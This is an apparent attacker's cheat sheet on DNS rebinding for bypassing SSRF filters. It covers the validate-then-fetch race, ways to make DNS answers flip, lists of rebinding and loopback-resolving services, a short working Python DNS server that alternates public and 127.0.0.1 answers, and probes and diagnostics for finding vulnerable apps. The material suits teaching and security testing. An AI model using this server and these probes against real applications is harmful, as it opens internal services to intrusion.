# DNS rebinding — the resolve-twice race

The filter resolves the name → sees a public IP → allows → the
fetcher resolves AGAIN → gets an internal IP → reaches inside.
The bypass lives in the gap between the two lookups.

---

## 1. The mechanism — why it works

```text
1. fetch("http://rebind.example/") arrives at the app
2. the app's VALIDATOR resolves rebind.example → 1.2.3.4 (public)
   → "not internal" → pass
3. the app's FETCHER resolves rebind.example → 127.0.0.1
   → connects to loopback
```

Two separate `getaddrinfo` calls — different answers — the check
passed on stale data. The precondition: validation and fetch are
SEPARATE lookups with separate resolution.

## 2. The shapes — how the answer alternates

```text
a) TTL=0 alternating A-records — the DNS server flips answers —
   the classic rbndr.us shape:
     1st query → 1.2.3.4  (the public one — the validator sees this)
     2nd query → 127.0.0.1 (the internal — the fetcher sees this)
   — needs the validator to query first and the fetcher second —
     ORDER matters — the flip-sequence must match

b) Round-robin A+AAAA — v4/v6 differ — the validator takes A
   (public), fetcher takes AAAA→::1 — or reverse:
     A  → 1.2.3.4
     AAAA → ::1        → fetcher prefers v6 → loopback
   — v6-capable fetchers + v4-only validators

c) Multi-A with resolver-order — two A-records public+internal —
   resolvers pick by their own order — race-y — useful when the
   validator's resolver picks differently than the fetcher's

d) CNAME-collapse — name → CNAME → internal-name — the validator
   sees the NAME (not the resolution) → the fetcher follows the
   CNAME → an internal hostname:
     rebind.example CNAME localhost → fetcher → 127.0.0.1
     rebind.example CNAME internal → internal-hostname
   — some validators check only the literal-name — cname-chases
     end at internal names

e) split-horizon — your DNS server answers differently by
   SOURCE/resolver — the validator's resolver ≠ the fetcher's —
   geographic/ECS-based answers — more infra than CTF needs

f) TTL=0 always-internal — validator-check is string-only —
   the name never resolves external — nip.io-style without
   rebinding:
     127.0.0.1.yourdomain → your DNS answers 127.0.0.1
   — only beats "is it a hostname?" checks, not resolution-checks
```

## 3. The public rebinding services

```text
rbndr.us      — the classic — gives a name + two IPs you pick —
                alternates answers — simple
1u.ms         — make-127.0.0.1-rr.1u.ms style names — static-ip names
nip.io        — <ip>.nip.io → that-ip — name-for-ip, NOT rebind
xip.io        — same family
sslip.io      — same family
localtest.me  — always → 127.0.0.1 — the static-loopback name
lvh.me        — always → 127.0.0.1
vcap.me       — always → 127.0.0.1
lacolhost.com — always → 127.0.0.1
spoofer.cable.virginm.net — 127.0.0.1
```

The nip.io-family aren't rebinding — they're NAME-FOR-IP — the
name resolves to the embedded IP always. They beat string-checks
("looks like a domain") and whitelist-checks ("not 127.") but a
real resolution-check still sees 127.0.0.1.

The rebind needs the DNS to answer DIFFERENTLY across two lookups
— your own authoritative server or a service like rbndr.

## 4. Rolling your own — authoritative rebinding

```text
Bind/NSD/dnsmasq/CoreDNS as authoritative for a zone you control —
the answer varies by query-count or round-robin:

# minimal — a one-file custom server (python + dnslib):
from dnslib import RR, A, QTYPE
from dnslib.server import DNSServer
state = {"n": 0}
def resolve(request, handler):
    r = request.reply()
    state["n"] += 1
    ip = "1.2.3.4" if state["n"] % 2 == 1 else "127.0.0.1"
    r.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))
    return r
DNSServer(resolve, port=5353).start()

# ttl=0 + alternating — the validator gets the public on query-1,
# the fetcher gets loopback on query-2
```

The TTL must be 0 — any caching between the two lookups collapses
the trick (the fetcher would re-use the validator's cached answer
— no — caching would give the SAME answer to both — rebind needs
the second lookup to actually re-query → ttl=0).

## 5. Where the rebind applies — validator-vs-fetcher topology

```text
Case A — the app does check-then-fetch with TWO lookups:
    urlparse → resolve(name) → check-ip → urllib/curl.fetch(url)
    → rebind works — the fetcher's own lookup is separate

Case B — the app resolves once and fetches by IP:
    resolve → check → fetch("http://1.2.3.4/", Host=name)
    → NO rebind — the fetcher never re-resolves — the checked IP
      IS the fetched IP — rebinding can't help here

Case C — the app resolves+checks but the fetcher uses a DIFFERENT
    resolver (system vs app-dns, or a proxy that re-resolves):
    → rebind works — the proxy does its own lookup

Case D — the check is string-only (no resolution):
    → rebind unnecessary — nip.io-name or just a literal internal-
      hostname suffices — a "looks-external" string
```

Detect the case: fetch a controlled name twice — if both fetches
hit your listener identically, no split — if the check ran and
the fetch still reached you, the topology is A or C.

## 6. The detection-probe — is this app rebindable?

```text
1. fetch("http://unique1.yourdomain/") → hits your listener
   → the fetcher resolves + fetches — normal-ssrf confirmed
2. fetch("http://unique2.yourdomain/") where your DNS first
   answers 1.2.3.4 then flips to YOUR-listener-ip — if the 2nd
   answer reaches you → the fetcher re-resolves on fetch →
   rebinding-topology exists → try internal-ip as the 2nd answer
3. send a name that resolves to 127.0.0.1 DIRECTLY (localtest.me)
   → refused → the check runs resolution → the rebind is the gap
```

## 7. The timing constraints — the race-window

```text
- the check-and-fetch are back-to-back — the DNS-flip must happen
  between them — milliseconds — an alternating-answer server
  handles it (answer-n-parity) — no time-dependence needed
- if the app CACHES the validation-answer for seconds — rebind
  dies — the fetcher re-uses the cached public-answer — detect:
  does the second fetch to the same name re-hit your listener?
- TTL=0 forces re-query — some stub-resolvers pin a minimum-ttl —
  the OS resolver may honor a floor — test empirically
```

## 8. The A+AAAA asymmetry — the v6-shadow

```text
Validator checks only A-records → A=public → pass
Fetcher prefers AAAA → AAAA=::1 → loopback

The v6-shadow needs a v6-capable fetcher — java/python-urllib3/
curl all do v6 — golang too — the validator that checks only A
misses the v6 answer entirely.

Same trick reversed:
  AAAA=public-v6, A=127.0.0.1 → validator checks AAAA (sees v6-
  public) → fetcher takes A → loopback
```

## 9. The rebind through a proxy

```text
App → egress-proxy → target
The proxy does the DNS — the app's check is separate → the
rebind works AGAINST THE PROXY — you need the proxy to re-resolve
on the real fetch — many proxies cache-dns — test:
   fetch(name-that-flips) → does the 2nd answer reach you via
   the proxy? the proxy's cache-behavior decides
```

## 10. The failed-rebind diagnostics

```text
rebind → connection-error → the 2nd answer didn't reach →
   - the validator's answer was cached and reused (Case B)
   - the fetcher pins the answer from its own first-lookup
   - your DNS flipped too late — verify with a manual dig twice
rebind → still external-ip → the flip didn't happen — check the
   server-state — is the parity off-by-one?
rebind → filter- blocked → the check ran on the SAME lookup the
   fetch would use — no gap — Case B again — different topology —
   pivot to parser-differential instead
```

## 11. When to spend probes on rebind

```text
1. black-list check exists (internal-IPs blocked) — rebind is the
   resolution-gap bypass
2. the check happens at validation-time — not fetch-time
3. two separate resolutions confirmed (probe above)
4. you control a rebinding-DNS — rbndr or your own
5. the alternation-sequence matches — public-then-internal —
   reversed order fails the same way

Skip when: no DNS you control, or the check is fetch-time (the
resolution and fetch are one call — nothing to separate).
```
